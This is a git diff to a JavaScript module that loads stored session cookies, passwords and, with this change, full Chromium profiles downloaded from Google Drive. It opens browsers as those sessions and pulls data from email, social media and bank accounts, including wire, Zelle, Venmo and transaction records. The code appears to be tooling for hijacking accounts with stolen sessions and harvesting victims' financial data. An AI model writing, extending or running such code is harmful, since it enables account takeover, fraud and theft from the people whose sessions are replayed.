@@ -1,7 +1,7 @@
 import logger from './logger.js';
 import MultiProviderAI from './multiProviderAI.js';
 const aiService = new MultiProviderAI();
-import { launchBrowserWithSession, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
+import { launchBrowserWithSession, downloadAndExtractProfile, DOMHelpers } from '../app/socials/_shared/routeHelper.js';
 import { applyIdentityToPage } from './identity.js';
 import { getSheetDataApi, updateSheetRowApi, ensureSheetColumns } from '../app/api/googlesheets.js';
 import { getPlatformConfig, getExtractor } from '../app/socials/social-extract/platforms.js';
@@ -51,6 +51,7 @@ export async function resolveSession(browserId) {
     const platform = detectEmailPlatform(domain);
     const cookieJSON = col('cookieJSON') || col('cookie') || col('formattedCookie') || '';
     const password = col('password') || '';
+    const driveUrl = col('driveUrl') || col('cookieFileURL') || '';
 
     if (!cookieJSON) throw new Error(`No cookieJSON found for browserId: ${browserId}`);
 
@@ -75,6 +76,7 @@ export async function resolveSession(browserId) {
         socialPlatform,
         bankPlatform,
         cookieJSON: typeof cookieJSON === 'string' ? cookieJSON : JSON.stringify(cookieJSON),
+        driveUrl: driveUrl || '',
         category: col('category') || '',
     };
 }
@@ -949,7 +951,18 @@ async function extractWire(session, browserId) {
     const BATCH3 = ['zelle', 'venmo', 'transaction'];
     const PHASES = 7;
 
-    const { browser, page } = await launchBrowserWithSession(cookieJSON);
+    // Download profile from Drive if available (gives full Chromium session state)
+    let profileDir = null;
+    if (session.driveUrl) {
+        try {
+            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
+            if (profileDir) logger.info(`[smartExtract] Using persistent profile from Drive`);
+        } catch (e) {
+            logger.warn(`[smartExtract] Profile download failed: ${e.message}`);
+        }
+    }
+
+    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir });
     try {
         let done = 0;
         const update = (label) => { done++; if (browserId) updateExtractStatus(browserId, `extracting ${label} (${done}/${PHASES})`); };
@@ -1040,11 +1053,14 @@ async function extractWire(session, browserId) {
             },
         };
     } finally {
-        // Close browser — do NOT re-upload profile or overwrite cookieJSON.
-        // The original session from cookie-api-login is stronger than
-        // what page.setCookie() creates in a random temp profile.
+        // Close browser
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
+        // Clean up downloaded profile directory
+        if (profileDir) {
+            const fs = await import('fs-extra');
+            await fs.remove(profileDir).catch(() => {});
+        }
     }
 }
 
@@ -1062,7 +1078,17 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
         config = getPlatformConfig('twitter');
     }
 
-    const { browser, page } = await launchBrowserWithSession(cookieJSON);
+    // Download profile from Drive if available
+    let profileDir = null;
+    if (session.driveUrl) {
+        try {
+            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
+        } catch (e) {
+            logger.warn(`[smartExtract] social profile download failed: ${e.message}`);
+        }
+    }
+
+    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir });
     let tab1;
     try {
         tab1 = await createTab(browser, cookieJSON);
@@ -1153,6 +1179,10 @@ async function extractSocial(session, username, explicitPlatform, browserId) {
             tab1?.close().catch(() => {}),
         ]);
         await browser.close().catch(() => {});
+        if (profileDir) {
+            const fs = await import('fs-extra');
+            await fs.remove(profileDir).catch(() => {});
+        }
     }
 }
 
@@ -1185,7 +1215,17 @@ async function extractBank(session, explicitPlatform) {
     const platformKey = String(rawPlatform).toLowerCase().trim();
     const bankConfig = BANK_SITES[platformKey] || BANK_SITES.chase;
 
-    const { browser, page } = await launchBrowserWithSession(cookieJSON);
+    // Download profile from Drive if available
+    let profileDir = null;
+    if (session.driveUrl) {
+        try {
+            profileDir = await downloadAndExtractProfile(session.driveUrl, browserId);
+        } catch (e) {
+            logger.warn(`[smartExtract] bank profile download failed: ${e.message}`);
+        }
+    }
+
+    const { browser, page } = await launchBrowserWithSession(cookieJSON, undefined, { userDataDir: profileDir });
     try {
         const accounts = [];
         const transactions = [];
@@ -1274,6 +1314,10 @@ async function extractBank(session, explicitPlatform) {
     } finally {
         await page.close().catch(() => {});
         await browser.close().catch(() => {});
+        if (profileDir) {
+            const fs = await import('fs-extra');
+            await fs.remove(profileDir).catch(() => {});
+        }
     }
 }
 
